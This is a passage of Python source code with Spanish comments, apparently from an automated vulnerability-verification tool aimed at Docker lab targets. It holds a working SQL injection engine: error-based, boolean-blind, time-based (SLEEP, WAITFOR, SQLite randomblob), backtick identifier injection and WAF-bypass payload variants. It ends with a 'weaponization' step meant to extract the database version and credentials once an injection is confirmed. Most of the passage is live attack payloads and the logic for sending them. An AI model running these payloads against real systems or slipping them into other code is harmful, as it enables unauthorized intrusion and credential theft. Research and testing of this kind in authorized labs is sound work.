                                     data=payload if m != "GET" else None,
                                     params=payload if m == "GET" else None,
                                     headers=_hdrs or None)
                # Auto-detect JSON mode: if form-encoded returns 400/415, switch permanently
                if (not _json_probed and not _use_json_body and m != "GET"
                        and getattr(resp, "status_code", 200) in (400, 415)):
                    _json_probed = True
                    _use_json_body = True
                    _hdrs2 = dict(_hdrs); _hdrs2.setdefault("Content-Type", "application/json")
                    resp = _http_request(m, base_url + endpoint_path, timeout=_SQLI_SLEEP_SECONDS + 15,
                                        json=payload,
                                        headers=_hdrs2 or None)
                    if getattr(resp, "status_code", 400) < 400:
                        res.evidence["json_body_mode"] = True
            except Exception:
                return None
            elapsed = time.time() - t0
            if capture_body and "respuesta_control_recorte" not in res.evidence:
                # recorte de la respuesta de CONTROL (sin inyeccion) -- la unica evidencia real
                # (ademas de los tiempos) que esta tecnica puede capturar, ya que el oraculo es
                # puramente temporal; sirve igual para que el bucle de aprendizaje-y-reintento
                # del LLM detecte un endpoint/parametro equivocado (p.ej. un 404 propio).
                res.evidence["respuesta_control_recorte"] = (getattr(resp, "text", "") or "")[:500]
            return elapsed

        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "metodo": m, "sqli_param": sqli_param})

        # Fast path: try error-based SQLi BEFORE slow time-based probes — covers MySQL, Postgres, MSSQL.
        # Saves ~30-60s per CVE when the target responds with an error instead of staying silent.
        step("intento rapido error-based (extractvalue/updatexml) antes de time-based...")
        # Baseline: fetch the endpoint with the original value to check if error strings
        # are already present in a normal response (pre-existing errors must not trigger FP).
        _eb_baseline_body = ""
        try:
            _bl_params = dict(base_params)
            _bl_hdrs = dict(custom_headers or {})
            if _use_json_body and m != "GET":
                _bl_hdrs.setdefault("Content-Type", "application/json")
                _bl_r = _http_request(m, base_url + endpoint_path, timeout=12,
                                      json=_bl_params, headers=_bl_hdrs)
            else:
                _bl_r = _http_request(m, base_url + endpoint_path, timeout=12,
                                      params=_bl_params if m == "GET" else None,
                                      data=_bl_params if m != "GET" else None,
                                      headers=_bl_hdrs)
            _eb_baseline_body = getattr(_bl_r, "text", "") or ""
        except Exception:
            pass
        _eb_payloads = {
            "mysql_xp": f"{orig_value}' AND extractvalue(1,concat(0x7e,version()))-- -",
            "mysql_ux": f"{orig_value}' AND updatexml(1,concat(0x7e,version()),1)-- -",
            "mysql_xp2": f"{orig_value} AND extractvalue(1,concat(0x7e,version()))-- -",
            "pg_cast": f"{orig_value}' AND CAST(version() AS INTEGER)-- -",
            "mssql_conv": f"{orig_value}' AND 1=CONVERT(int,@@version)-- -",
            # SQLite3: no error functions, but syntax errors leak query structure
            "sqlite_syntax": f"{orig_value}' AND 1=CAST(sqlite_version() AS BLOB)-- -",
            "sqlite_bare": f"{orig_value}' AND 1=(SELECT 1 FROM sqlite_master LIMIT 1)-- -",
        }
        _eb_sigs = ("extractvalue", "XPATH syntax error", "updatexml", "SQL syntax",
                    "mysql_num_rows", "PG::InvalidTextRepresentation",
                    "Conversion failed when converting", "ODBC SQL Server Driver",
                    # SQLite3 error signatures
                    "sqlite3.OperationalError", "no such function", "near \"",
                    "unrecognized token", "incomplete input", "sqlite_version")
        for _eb_key, _eb_p in _eb_payloads.items():
            try:
                _eb_pl = dict(base_params); _eb_pl[sqli_param] = _eb_p
                _eb_hdrs = dict(custom_headers or {})
                if _use_json_body and m != "GET":
                    _eb_hdrs.setdefault("Content-Type", "application/json")
                    _eb_r = _http_request(m, base_url + endpoint_path, timeout=15,
                                          json=_eb_pl,
                                          headers=_eb_hdrs or None)
                else:
                    _eb_r = _http_request(m, base_url + endpoint_path, timeout=15,
                                          params=_eb_pl if m == "GET" else None,
                                          data=_eb_pl if m != "GET" else None,
                                          headers=_eb_hdrs or None)
                _eb_body = getattr(_eb_r, "text", "") or ""
                # Only fire if the error signal is NEW — not already in the baseline response
                _eb_new_sigs = [s for s in _eb_sigs
                                if s in _eb_body and s not in _eb_baseline_body]
                if _eb_new_sigs:
                    res.verified = True
                    res.ok = True
                    res.confidence = "confirmed"
                    # Try to extract MySQL version from XPATH error: ~8.0.46 pattern
                    _eb_ver_m = re.search(r'~(\d+\.\d+\.\d+)', _eb_body)
                    _eb_ver = _eb_ver_m.group(1) if _eb_ver_m else None
                    _eb_ev: dict = {
                        "tecnica": "error-based",
                        "variante_eb": _eb_key,
                        "payload_ganador": _eb_p,
                        "respuesta_cuerpo_recorte": _eb_body[:500],
                    }
                    if _eb_ver:
                        _eb_ev["mysql_version_extraida"] = _eb_ver
                        step(f"VERIFICADO en ruta rapida error-based ({_eb_key}): MySQL {_eb_ver}")
                    else:
                        step(f"VERIFICADO en ruta rapida error-based ({_eb_key})!")
                    res.evidence.update(_eb_ev)
                    res.detail = (f"SQLI ERROR-BASED confirmada (ruta rapida): "
                                  f"'{sqli_param}={_eb_p!r}' devolvio error de motor SQL"
                                  + (f" (MySQL {_eb_ver})" if _eb_ver else ""))
                    return res
            except Exception:
                pass

        # Boolean-blind differential: compare response LENGTH for TRUE vs FALSE conditions.
        # Runs BEFORE time-based so WAF-protected or non-MySQL targets are covered without
        # requiring SLEEP support. Only active when the control response is non-trivial (>10B)
        # so that an empty-data response doesn't produce noisy length diffs.
        try:
            def _bool_send(val: str) -> Optional[int]:
                payload = dict(base_params); payload[sqli_param] = val
                try:
                    _bhdrs = dict(custom_headers or {})
                    if _use_json_body and m != "GET":
                        _bhdrs.setdefault("Content-Type", "application/json")
                        r = _http_request(m, base_url + endpoint_path, timeout=15,
                                          json=payload,
                                          headers=_bhdrs or None)
                    else:
                        r = _http_request(m, base_url + endpoint_path, timeout=15,
                                          data=payload if m != "GET" else None,
                                          params=payload if m == "GET" else None,
                                          headers=_bhdrs or None)
                    return len(getattr(r, "text", "") or "")
                except Exception:
                    return None

            _ctrl_len = _bool_send(orig_value)

            # Empty-response expansion check: control returned [] / {} / empty JSON (≤5B).
            # In this mode TRUE (OR 1=1) should expand results; FALSE (OR 1=2) keeps empty.
            # Only meaningful for OR injection (AND would keep the empty set empty either way).
            if _ctrl_len is not None and _ctrl_len <= 5:
                _exp_or_pairs = [
                    (f"{orig_value}' OR '1'='1", f"{orig_value}' OR '1'='2"),
                    (f"{orig_value} OR 1=1", f"{orig_value} OR 1=2"),
                    (f"{orig_value}\" OR \"1\"=\"1", f"{orig_value}\" OR \"1\"=\"2"),
                    (f"{orig_value}' OR 1=1-- -", f"{orig_value}' OR 1=2-- -"),
                    (f"{orig_value} OR 1=1-- -", f"{orig_value} OR 1=2-- -"),
                ]
                for _exp_t, _exp_f in _exp_or_pairs:
                    _t_len = _bool_send(_exp_t)
                    _f_len = _bool_send(_exp_f)
                    if (_t_len is not None and _f_len is not None
                            and _t_len > _f_len and _t_len >= 8
                            and (_t_len - _f_len) >= 6):
                        res.verified = True
                        res.ok = True
                        res.confidence = "probable"
                        res.evidence.update({
                            "tecnica": "boolean-blind-empty-expansion",
                            "sqli_param": sqli_param, "metodo": m,
                            "endpoint": endpoint_path,
                            "true_payload": _exp_t, "false_payload": _exp_f,
                            "len_true": _t_len, "len_false": _f_len,
                            "len_control": _ctrl_len,
                        })
                        res.detail = (
                            f"SQLI CONFIRMADO (boolean-blind OR-expansion): "
                            f"OR 1=1 retorno {_t_len}B, OR 1=2 retorno {_f_len}B "
                            f"(control={_ctrl_len}B) — resultados se expanden con OR 1=1"
                        )
                        step(f"VERIFICADO empty-expansion: TRUE={_t_len}B FALSE={_f_len}B ctrl={_ctrl_len}B")
                        return res

            if _ctrl_len is not None and _ctrl_len > 5:
                # Adaptive threshold: 5% of control response or minimum 8B for small responses.
                _bool_threshold = max(8, int(_ctrl_len * 0.05))
                _bool_pairs = [
                    (f"{orig_value} AND 1=1", f"{orig_value} AND 1=2"),
                    (f"{orig_value}' AND '1'='1", f"{orig_value}' AND '1'='2"),
                    (f"{orig_value}\" AND \"1\"=\"1", f"{orig_value}\" AND \"1\"=\"2"),
                    (f"{orig_value} OR 1=1", f"{orig_value} OR 1=2"),
                    (f"{orig_value}' OR '1'='1", f"{orig_value}' OR '1'='2"),
                    # Numeric contexts where the injection has no leading quote
                    (f"{orig_value}) AND (1=1", f"{orig_value}) AND (1=2"),
                    # Comment-terminated variants for MySQL/PostgreSQL
                    (f"{orig_value}' AND 1=1-- -", f"{orig_value}' AND 1=2-- -"),
                    (f"{orig_value} AND 1=1-- -", f"{orig_value} AND 1=2-- -"),
                    # IN-clause injection: closes the in() paren before the boolean
                    # e.g. value IN (orig) → value IN (1) OR 1=1-- -)
                    (f"{orig_value}) OR 1=1-- -", f"{orig_value}) AND 1=2-- -"),
                    (f"{orig_value}') OR 1=1-- -", f"{orig_value}') AND 1=2-- -"),
                ]
                for _true_p, _false_p in _bool_pairs:
                    _true_len = _bool_send(_true_p)
                    _false_len = _bool_send(_false_p)
                    # Accept pair if:
                    # 1. Differential is large enough (TRUE and FALSE diverge)
                    # 2. At least ONE of them is close to the baseline (anchors to real behavior):
                    #    - AND pairs: TRUE ≈ control, FALSE < control
                    #    - OR  pairs: FALSE ≈ control, TRUE > control (all rows returned)
                    _base_tol = max(100, _ctrl_len // 2)
                    _true_near_base = abs(_true_len - _ctrl_len) < _base_tol if _true_len is not None else False
                    _false_near_base = abs(_false_len - _ctrl_len) < _base_tol if _false_len is not None else False
                    if (_true_len is not None and _false_len is not None
                            and abs(_true_len - _false_len) >= _bool_threshold
                            and (_true_near_base or _false_near_base)):
                        res.verified = True
                        res.ok = True
                        res.confidence = "probable"
                        res.evidence.update({
                            "tecnica": "generic-boolean-blind",
                            "payload_true": _true_p,
                            "payload_false": _false_p,
                            "len_control": _ctrl_len,
                            "len_true": _true_len,
                            "len_false": _false_len,
                            "diferencial": abs(_true_len - _false_len),
                        })
                        res.detail = (
                            f"SQLI BOOLEAN-BLIND confirmada: '{sqli_param}' con TRUE={_true_p!r} "
                            f"({_true_len}B) vs FALSE={_false_p!r} ({_false_len}B) -- diferencial "
                            f"de {abs(_true_len - _false_len)}B mayor que el umbral de 20B"
                        )
                        step(f"VERIFICADO boolean-blind: diferencial {abs(_true_len - _false_len)}B "
                             f"(TRUE={_true_len}B, FALSE={_false_len}B, control={_ctrl_len}B)")
                        return res
        except Exception as _bb_exc:
            step(f"[warn] boolean-blind fallo, continuando con time-based: {_bb_exc!r:.80}")

        step("midiendo tiempos de respuesta de control (sin inyeccion)...")
        base_times = [t for t in (timed_send(orig_value, capture_body=True),
                                  timed_send(orig_value),
                                  timed_send(orig_value)) if t is not None]
        if not base_times:
            res.detail = "las peticiones de control fallaron (sin tiempo base con el que comparar)"
            return res
        base_times.sort()
        base_median = base_times[len(base_times) // 2]
        res.evidence["tiempo_base_mediana_s"] = round(base_median, 2)

        # Adaptive threshold: at least SLEEP_SECONDS/2 above the baseline, and never
        # below SLEEP_SECONDS * 0.6 (floor prevents triggering on a 0.1s baseline).
        threshold = max(base_median + (_SQLI_SLEEP_SECONDS / 2),
                        _SQLI_SLEEP_SECONDS * 0.6)
        tried = []
        found = False
        for ctx in _SQLI_CONTEXTS:
            if found:
                break
            for sleep_expr in _SQLI_SLEEP_EXPRS:
                if found:
                    break
                for op in _SQLI_BOOLEAN_OPS:
                    if found:
                        break
                    clause = _sqli_sleep_clause(op, sleep_expr)
                    for cm in _SQLI_COMMENTS:
                        payload_val = f"{orig_value}{ctx} {op} {clause}{cm}"
                        step(f"probando {m} {endpoint} con {sqli_param}={payload_val!r} (time-based)...")
                        t1 = timed_send(payload_val)
                        t2 = timed_send(payload_val)
                        entry = {"payload": payload_val, "tiempo_1_s": round(t1, 2) if t1 else None,
                                 "tiempo_2_s": round(t2, 2) if t2 else None}
                        tried.append(entry)
                        if t1 is not None and t2 is not None and t1 >= threshold and t2 >= threshold:
                            found = True
                            res.evidence["payload_ganador"] = payload_val
                            res.evidence["tiempo_1_ganador_s"] = round(t1, 2)
                            res.evidence["tiempo_2_ganador_s"] = round(t2, 2)
                            step(f"VERIFICADO: {sqli_param}={payload_val!r} retraso la respuesta "
                                 f"~{round((t1+t2)/2, 1)}s de forma CONSISTENTE en 2 repeticiones "
                                 f"independientes (linea base {round(base_median, 1)}s) -- SQLi ciega "
                                 f"por tiempo, no ruido de red/Docker.")
                            break

        # MSSQL: WAITFOR DELAY es una INSTRUCCION, no una funcion que valga dentro de un AND/OR --
        # necesita una query APILADA (';' cierra el SELECT original y abre una nueva). Casuistica
        # real de SQL Injection/Intruder/Generic_TimeBased.txt en PayloadsAllTheThings. Se prueba
        # aparte porque su forma no encaja en el bucle de arriba (SLEEP()/pg_sleep() si valen
        # dentro de una condicion AND/OR).
        if not found:
            waitfor_secs = f"0:0:{_SQLI_SLEEP_SECONDS:.0f}"
            for ctx in _SQLI_CONTEXTS:
                if found:
                    break
                payload_val = f"{orig_value}{ctx};WAITFOR DELAY '{waitfor_secs}'--"
                step(f"probando {m} {endpoint} con {sqli_param}={payload_val!r} (MSSQL WAITFOR, "
                     f"time-based)...")
                t1 = timed_send(payload_val)
                t2 = timed_send(payload_val)
                entry = {"payload": payload_val, "tiempo_1_s": round(t1, 2) if t1 else None,
                         "tiempo_2_s": round(t2, 2) if t2 else None}
                tried.append(entry)
                if t1 is not None and t2 is not None and t1 >= threshold and t2 >= threshold:
                    found = True
                    res.evidence["payload_ganador"] = payload_val
                    res.evidence["tiempo_1_ganador_s"] = round(t1, 2)
                    res.evidence["tiempo_2_ganador_s"] = round(t2, 2)
                    step(f"VERIFICADO (MSSQL WAITFOR): {sqli_param}={payload_val!r} retraso la "
                         f"respuesta de forma CONSISTENTE en 2 repeticiones independientes.")

        # SQLITE timing (no SLEEP/pg_sleep): HEX(randomblob(N)) fuerza la CPU a generar
        # y convertir a hex N bytes de datos aleatorios, provocando un retraso medible.
        # Con 50 MB (~100 MB de hex) el retraso es ~1-3s en un contenedor Docker estandar
        # (confirmado empiricamente). Solo se intenta si los SLEEP/pg_sleep ya fallaron.
        if not found:
            _sqlite_threshold = base_median + 1.0  # umbral mas bajo: 1s suficiente para randomblob
            for ctx in _SQLI_CONTEXTS:
                if found:
                    break
                for cm in _SQLI_COMMENTS:
                    # AND: solo ejecuta randomblob si la condicion anterior es True
                    _pl = f"{orig_value}{ctx} AND (SELECT CASE WHEN ({_SQLI_SQLITE_TIMING_EXPR}>'') THEN 1 ELSE 0 END)=1{cm}"
                    step(f"probando {m} {endpoint} con {sqli_param}={_pl!r} (SQLite randomblob timing)...")
                    t1 = timed_send(_pl)
                    t2 = timed_send(_pl)
                    entry = {"payload": _pl, "tiempo_1_s": round(t1, 2) if t1 else None,
                             "tiempo_2_s": round(t2, 2) if t2 else None,
                             "estrategia": "sqlite-randomblob"}
                    tried.append(entry)
                    if t1 is not None and t2 is not None and t1 >= _sqlite_threshold and t2 >= _sqlite_threshold:
                        found = True
                        res.evidence["payload_ganador"] = _pl
                        res.evidence["tiempo_1_ganador_s"] = round(t1, 2)
                        res.evidence["tiempo_2_ganador_s"] = round(t2, 2)
                        res.evidence["estrategia"] = "sqlite-randomblob-timing"
                        step(f"VERIFICADO (SQLite randomblob): {sqli_param}={_pl!r} retraso la "
                             f"respuesta ~{round((t1+t2)/2, 1)}s CONSISTENTE -- SQLi ciega "
                             f"por tiempo en SQLite confirmada.")
                        break

        # MYSQL BACKTICK IDENTIFIER FROM-INJECTION (time-based via SLEEP en WHERE):
        # Cuando el parametro vulnerable se usa como ALIAS de columna en MySQL (Django annotate(),
        # raw SQL AS `{col}`, etc.), los payloads estandar de tipo 'valor' AND/OR SLEEP no
        # funcionan porque el contexto sintactico de AS <identifier> solo acepta un identificador
        # simple -- cualquier operador despues del identificador es un error de sintaxis.
        # Estrategia: romper el backtick para cerrar el identifier early, luego substituir el
        # FROM original por uno que incluya SLEEP en el WHERE:
        #   col = x` FROM {table} WHERE (SELECT SLEEP(4) FROM DUAL)=0 {groupby}-- -
        # Genera: ... AS `x` FROM {table} WHERE (SELECT SLEEP(4) FROM DUAL)=0 {groupby}
        # La subquery en el WHERE fuerza la evaluacion de SLEEP antes de la resolucion de
        # columnas (MySQL evalua el WHERE por fila ANTES del GROUP BY / HAVING). Requiere
        # conocer el nombre real de la tabla (sqli_identifier_table_hint).
        if not found and sqli_identifier_table_hint:
            # Parse hint: "table_name GROUP BY col" or "table_name WHERE cond GROUP BY col"
            # We need to inject SLEEP in the WHERE clause BEFORE GROUP BY.
            # Normalize: extract table name and groupby clause (if any).
            _hint_upper = sqli_identifier_table_hint.upper()
            if " GROUP BY" in _hint_upper:
                _split_idx = _hint_upper.index(" GROUP BY")
                _table_part = sqli_identifier_table_hint[:_split_idx].strip()
                _groupby_part = " " + sqli_identifier_table_hint[_split_idx:].strip()
            else:
                _table_part = sqli_identifier_table_hint.strip()
                _groupby_part = ""
            step(f"probando inyeccion backtick-FROM (MySQL identifier) en {sqli_param}="
                 f"<valor>`` FROM {_table_part}... "
                 f"(SQLi en contexto de alias de columna)...")
            for sleep_expr in _SQLI_SLEEP_EXPRS:
                if found:
                    break
                payload_val = (f"{orig_value}`"
                               f" FROM {_table_part}"
                               f" WHERE (SELECT {sleep_expr} FROM DUAL)=0"
                               f"{_groupby_part}-- -")
                step(f"probando {m} {endpoint} con {sqli_param}={payload_val!r} "
                     f"(backtick-FROM time-based)...")
                t1 = timed_send(payload_val)
                t2 = timed_send(payload_val)
                entry = {"payload": payload_val, "tiempo_1_s": round(t1, 2) if t1 else None,
                         "tiempo_2_s": round(t2, 2) if t2 else None,
                         "estrategia": "backtick-FROM"}
                tried.append(entry)
                if t1 is not None and t2 is not None and t1 >= threshold and t2 >= threshold:
                    found = True
                    res.evidence["payload_ganador"] = payload_val
                    res.evidence["tiempo_1_ganador_s"] = round(t1, 2)
                    res.evidence["tiempo_2_ganador_s"] = round(t2, 2)
                    res.evidence["estrategia"] = "backtick-FROM-injection"
                    step(f"VERIFICADO (backtick-FROM): {sqli_param}={payload_val!r} retraso la "
                         f"respuesta ~{round((t1+t2)/2, 1)}s CONSISTENTE en 2 repeticiones "
                         f"-- SQLi de identifier MySQL (alias de columna) confirmada.")
                    break

        # MYSQL BACKTICK IDENTIFIER ERROR-BASED DETECTION (fallback):
        # Si todos los payloads de tiempo fallan pero el parametro podria ser un identifier MySQL
        # (backtick-quoting), un backtick literal en el valor causa un error de sintaxis SQL que
        # cambia el codigo HTTP de 200 a 5xx. Este cambio diferencial prueba que la entrada
        # del usuario llega sin sanitizar a un contexto SQL de identifier -- prueba mas debil que
        # el time-based pero real. Se confirma verificando que el cuerpo de la respuesta de error
        # contiene palabras clave de error MySQL ("SQL syntax", "1064", "mysql") para descartar
        # errores de validacion propios de la aplicacion.
        if not found:
            step(f"probando deteccion error-based backtick para {sqli_param} "
                 f"(MySQL identifier context, diferencial HTTP 2xx vs 5xx)...")
            payload_backtick = f"{orig_value}`"
            resp_bt = None
            try:
                payload_bt_dict = dict(base_params)
                payload_bt_dict[sqli_param] = payload_backtick
                resp_bt = _http_request(m, base_url + endpoint_path, timeout=15,
                                        data=payload_bt_dict if m != "GET" else None,
                                        params=payload_bt_dict if m == "GET" else None)
            except Exception:
                pass
            if resp_bt is not None:
                status_bt = getattr(resp_bt, "status_code", 0)
                body_bt = (getattr(resp_bt, "text", "") or "")[:1000]
                sql_error_markers = ("SQL syntax", "1064", "mysql", "syntax error",
                                     "near", "1054", "unknown column", "OperationalError")
                has_sql_error = any(m_kw.lower() in body_bt.lower() for m_kw in sql_error_markers)
                # Solo marca como verificado si el codigo de control era 2xx Y la respuesta
                # de inyeccion es 4xx/5xx Y el cuerpo contiene marcadores de error SQL
                # (no un error de validacion propio de la app como "invalid input").
                ctrl_resp = None
                try:
                    ctrl_dict = dict(base_params)
                    ctrl_resp = _http_request(m, base_url + endpoint_path, timeout=10,
                                              data=ctrl_dict if m != "GET" else None,
                                              params=ctrl_dict if m == "GET" else None)
                except Exception:
                    pass
                ctrl_status = getattr(ctrl_resp, "status_code", 0) if ctrl_resp else 0
                if ctrl_status in range(200, 300) and status_bt >= 400 and has_sql_error:
                    found = True
                    res.evidence["payload_ganador"] = payload_backtick
                    res.evidence["backtick_control_status"] = ctrl_status
                    res.evidence["backtick_error_status"] = status_bt
                    res.evidence["backtick_error_body_recorte"] = body_bt[:300]
                    res.evidence["estrategia"] = "backtick-identifier-error-based"
                    step(f"VERIFICADO (backtick error-based): {sqli_param}={payload_backtick!r} "
                         f"cambio el codigo HTTP de {ctrl_status} a {status_bt} con error SQL "
                         f"en el cuerpo -- input no sanitizado llega al contexto SQL de identifier "
                         f"MySQL (backtick-quoting).")
                else:
                    step(f"backtick error-based: status_control={ctrl_status}, "
                         f"status_bt={status_bt}, has_sql_error={has_sql_error} -- "
                         f"no se confirmo inyeccion de identifier.")

        # WAF BYPASS: variantes de encoding del token SLEEP(N) para eludir filtros que bloquean
        # la palabra clave exacta (case/inline-comments/URL-encoding). Solo se prueban los
        # dialectos MySQL/Postgres que ya se saben soportados en el lab (omitimos WAITFOR y
        # randomblob que ya tienen su propio bloque). Prioridad baja: se intenta SOLO si los
        # payloads estandar ya fallaron y budget lo permite.
        if not found:
            try:
                from .payload_kb import load_sqli_waf_bypass_variants as _sqli_waf_bypass
                _waf_bypass_tried = False
                for _base_sleep_expr in _SQLI_SLEEP_EXPRS:
                    if found:
                        break
                    for _bypass_expr in _sqli_waf_bypass(_base_sleep_expr):
                        if found:
                            break
                        for ctx in _SQLI_CONTEXTS:
                            if found:
                                break
                            for op in _SQLI_BOOLEAN_OPS:
                                if found:
                                    break
                                _waf_clause = _sqli_sleep_clause(op, _bypass_expr)
                                for cm in _SQLI_COMMENTS:
                                    _waf_pl = f"{orig_value}{ctx} {op} {_waf_clause}{cm}"
                                    _waf_bypass_tried = True
                                    step(f"WAF bypass: {sqli_param}={_waf_pl!r}...")
                                    _t1 = timed_send(_waf_pl)
                                    _t2 = timed_send(_waf_pl)
                                    _entry = {"payload": _waf_pl, "tiempo_1_s": round(_t1, 2) if _t1 else None,
                                              "tiempo_2_s": round(_t2, 2) if _t2 else None,
                                              "estrategia": "waf-bypass-sleep"}
                                    tried.append(_entry)
                                    if (_t1 is not None and _t2 is not None
                                            and _t1 >= threshold and _t2 >= threshold):
                                        found = True
                                        res.evidence["payload_ganador"] = _waf_pl
                                        res.evidence["tiempo_1_ganador_s"] = round(_t1, 2)
                                        res.evidence["tiempo_2_ganador_s"] = round(_t2, 2)
                                        res.evidence["estrategia"] = "waf-bypass-sleep"
                                        step(f"VERIFICADO (WAF bypass SLEEP): {sqli_param}={_waf_pl!r} "
                                             f"retraso la respuesta ~{round((_t1+_t2)/2, 1)}s CONSISTENTE "
                                             f"-- filtro WAF evadido con variante de encoding.")
                                        break
                if not found and _waf_bypass_tried:
                    step("WAF bypass SLEEP: ninguna variante produjo retraso consistente.")
            except ImportError:
                pass

        # IN-BAND BOOLEAN SQLi fallback: cuando el motor no soporta SLEEP/pg_sleep/randomblob
        # (p.ej. SQLite) pero la respuesta REFLEJA los datos de la consulta (como str(fetchall())),
        # podemos comparar la respuesta "true" (OR 1=1) con la baseline "false" (OR 1=2).
        # Si la respuesta "true" es notablemente mas grande que la "false", hay inyeccion.
        # Esta tecnica es un ultimo recurso para labs con SQLite + app que devuelve los datos.
        # Incluye patrones de inyeccion de conector (CVE-2025-64459 Django _connector): cuando el
        # parametro ES el conector SQL (no un valor), el bypass es el parametro completo 'OR 1=1'.
        if not found:
            _bool_payloads = [
                (f"{orig_value}' OR '1'='1",  f"{orig_value}' OR '1'='2"),   # string context
                (f"{orig_value}' OR 1=1-- -",  f"{orig_value}' OR 1=2-- -"), # comment
                (f"{orig_value} OR 1=1-- -",   f"{orig_value} OR 1=2-- -"),  # numeric
                ("OR 1=1",                      "AND 1=0"),                   # conector SQL completo
                ("OR 1=1-- -",                  "AND 1=2-- -"),               # conector con comentario
            ]
            for _true_pl, _false_pl in _bool_payloads:
                if found:
                    break
                try:
                    _true_d = dict(base_params); _true_d[sqli_param] = _true_pl
                    _false_d = dict(base_params); _false_d[sqli_param] = _false_pl
                    _resp_t = _http_request(m, base_url + endpoint_path, timeout=15,
                                            data=_true_d if m != "GET" else None,
                                            params=_true_d if m == "GET" else None)
                    _resp_f = _http_request(m, base_url + endpoint_path, timeout=15,
                                            data=_false_d if m != "GET" else None,
                                            params=_false_d if m == "GET" else None)
                except Exception:
                    continue
                _st = getattr(_resp_t, "status_code", 0)
                _sf = getattr(_resp_f, "status_code", 0)
                _bt = getattr(_resp_t, "text", "") or ""
                _bf = getattr(_resp_f, "text", "") or ""
                # "true" debe: (a) devolver 2xx, (b) tener MAS datos que "false",
                # (c) el cuerpo "false" NO debe contener los mismos datos extra (es decir,
                # no es que siempre devuelva lo mismo sin importar el valor).
                _size_diff = len(_bt) - len(_bf)
                step(f"probando boolean in-band: size_true={len(_bt)}, size_false={len(_bf)}, "
                     f"diff={_size_diff} (true={_true_pl!r})")
                if (_st in range(200, 300) and _sf in range(200, 300)
                        and _size_diff >= 10 and _bt != _bf):
                    found = True
                    res.evidence["payload_ganador"] = _true_pl
                    res.evidence["payload_false"] = _false_pl
                    res.evidence["respuesta_true_len"] = len(_bt)
                    res.evidence["respuesta_false_len"] = len(_bf)
                    res.evidence["estrategia"] = "boolean-inband"
                    res.evidence["respuesta_cuerpo_recorte"] = _bt[:500]
                    step(f"VERIFICADO (boolean in-band): '{_true_pl}' devolvio {len(_bt)} bytes "
                         f"vs '{_false_pl}' devolvio {len(_bf)} bytes -- diferencia de "
                         f"{_size_diff} bytes confirma inyeccion SQLi.")
                    break

        # Fallback: si confirm_string está configurado, compara la baseline (sin inyección)
        # con el payload OR-always-TRUE. Si el string secreto NO está en la baseline pero SÍ
        # aparece tras la inyección, hay SQLi in-band aunque el diferencial de tamaño sea 0
        # (p.ej. SQLite donde OR '1'='2' también fuerza 2 filas por razones de quoting).
        if not found and confirm_string:
            try:
                _resp_base = _http_request(m, base_url + endpoint_path, timeout=15,
                                           params=base_params if m == "GET" else None,
                                           data=base_params if m != "GET" else None)
                _base_body = getattr(_resp_base, "text", "") or ""
                if confirm_string not in _base_body:
                    for _cs_pl in (f"{orig_value}' OR '1'='1",
                                   f"{orig_value}' OR 1=1-- -",
                                   f"{orig_value} OR 1=1-- -"):
                        _inj_d = dict(base_params); _inj_d[sqli_param] = _cs_pl
                        _resp_inj = _http_request(m, base_url + endpoint_path, timeout=15,
                                                  params=_inj_d if m == "GET" else None,
                                                  data=_inj_d if m != "GET" else None)
                        _inj_body = getattr(_resp_inj, "text", "") or ""
                        if (getattr(_resp_inj, "status_code", 0) in range(200, 300)
                                and confirm_string in _inj_body):
                            found = True
                            res.evidence["payload_ganador"]          = _cs_pl
                            res.evidence["estrategia"]               = "boolean-inband-confirm"
                            res.evidence["confirm_string"]           = confirm_string
                            res.evidence["respuesta_cuerpo_recorte"] = _inj_body[:500]
                            res.evidence["baseline_len"]             = len(_base_body)
                            res.evidence["inyeccion_len"]            = len(_inj_body)
                            step(f"VERIFICADO (boolean in-band confirm): "
                                 f"'{sqli_param}={_cs_pl!r}' devolvio '{confirm_string}' "
                                 f"en el cuerpo ({len(_inj_body)} bytes) pero la baseline "
                                 f"({len(_base_body)} bytes) NO lo contenia -- SQLi in-band "
                                 f"confirmada por exfiltracion de datos.")
                            break
            except Exception:
                pass

        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            estrategia = res.evidence.get("estrategia", "tiempo")
            if estrategia == "backtick-identifier-error-based":
                res.detail = (f"SQLI IDENTIFIER MYSQL confirmada (error-based): {sqli_param}="
                              f"{res.evidence['payload_ganador']!r} cambio el codigo HTTP de "
                              f"{res.evidence['backtick_control_status']} a "
                              f"{res.evidence['backtick_error_status']} con error SQL en el cuerpo "
                              f"-- la entrada llega sin sanitizar al contexto backtick de MySQL")
            elif estrategia == "boolean-inband":
                res.detail = (f"SQLI BOOLEAN IN-BAND confirmada: '{sqli_param}={res.evidence['payload_ganador']!r}' "
                              f"devolvio {res.evidence['respuesta_true_len']} bytes vs "
                              f"'{res.evidence['payload_false']!r}' devolvio "
                              f"{res.evidence['respuesta_false_len']} bytes -- diferencia de "
                              f"{res.evidence['respuesta_true_len'] - res.evidence['respuesta_false_len']} bytes "
                              f"confirma que la entrada llega al motor SQL sin sanitizar")
            elif estrategia == "boolean-inband-confirm":
                res.detail = (f"SQLI IN-BAND confirmada por exfiltracion: "
                              f"'{sqli_param}={res.evidence['payload_ganador']!r}' "
                              f"devolvio '{res.evidence['confirm_string']}' en el cuerpo "
                              f"({res.evidence['inyeccion_len']} bytes) mientras que la baseline "
                              f"sin inyeccion ({res.evidence['baseline_len']} bytes) no lo contenia "
                              f"-- la entrada llega sin sanitizar al motor SQL")
            else:
                res.detail = (f"SQLI CIEGA POR TIEMPO confirmada: {sqli_param}="
                              f"{res.evidence['payload_ganador']!r} retraso la respuesta de forma "
                              f"consistente en 2 peticiones independientes, por encima de la linea "
                              f"base + la mitad del retraso pedido -- no es ruido de red/Docker")
            step("capturando evidencia visual (screenshots del laboratorio)...")
            shots, http_caps = _take_generic_screenshots_sqli(
                base_url, endpoint_path, m, base_params, sqli_param, res.evidence)
            if shots:
                res.evidence["screenshots"] = shots
            if http_caps:
                res.evidence["http_captures"] = http_caps
            # Weaponization: escalate confirmed SQLi → extract DB version / credentials
            if not res.evidence.get("weaponization"):
                try:
                    _sqli_payload_ganador = res.evidence.get("payload_ganador", "")
                    _sqli_wep = _try_weaponize_generic(
                        base_url=base_url,
                        endpoint=endpoint_path,
                        method=m,
                        query_params={sqli_param: _sqli_payload_ganador} if m == "GET" else None,
                        post_data={sqli_param: _sqli_payload_ganador} if m != "GET" else None,
                        hdrs=custom_headers or {},
                        confirm_string="",
                        vuln_class="sqli",
                        step=step,
                    )
                    if _sqli_wep.get("impact"):
